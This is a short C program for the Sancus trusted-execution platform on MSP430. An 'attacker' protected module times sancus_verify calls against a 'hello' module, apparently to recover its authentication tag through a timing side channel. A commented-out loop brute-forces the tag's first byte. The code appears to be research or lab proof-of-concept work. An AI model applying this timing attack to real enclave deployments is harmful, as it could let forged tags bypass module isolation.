#include <msp430.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sancus/sm_support.h>
#include <sancus_support/sm_io.h>
#include <sancus_support/timer.h>

/* ======== HELLO WORLD SM ======== */

const char* first_try = "\x54\x77\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

DECLARE_SM(attacker, 0x1234);
DECLARE_SM(hello, 0x1234);

void SM_ENTRY(hello) hello_init(void)
{
    pr_info("Hello from second SM");
}

void SM_ENTRY(attacker) attacker_init(void)
{
    pr_info("Hello from attacker SM");
}


void SM_ENTRY(attacker) attacker_guess_tag(void)
{
    uint tsc1, tsc2;
    timer_tsc_start();
    tsc1 = timer_tsc_end();

    char *buf = malloc(16);
    strcpy(buf, first_try);

    timer_tsc_start();
    sancus_verify(buf, &hello);
    tsc2 = timer_tsc_end();
    pr_info2("Time to verify: %u, tsc overhead: %u\n", tsc2, tsc1);


    // char c = 0x00;
    // for ( int i = 0; i <= 255; i++ ){
    //     buf[0] = c;
    //     c++;

    //     timer_tsc_start();
    //     sancus_verify(buf, &hello);
    //     tsc2 = timer_tsc_end();
    //     if( tsc2 != -26915 ){
    //         pr_info3("%.2x%.2x%.2x\n", *(buf+0), *(buf+1), *(buf+2));
    //         pr_info2("Time to verify: %d, tsc overhead: %d\n", tsc2, tsc1);
    //     }
    // }
}


/* ======== UNTRUSTED CONTEXT ======== */

int main()
{
    msp430_io_init();

    sancus_enable(&attacker);
    sancus_enable(&hello);
    pr_sm_info(&attacker);
    pr_sm_info(&hello);

    attacker_init();
    hello_init();

    attacker_guess_tag();
}
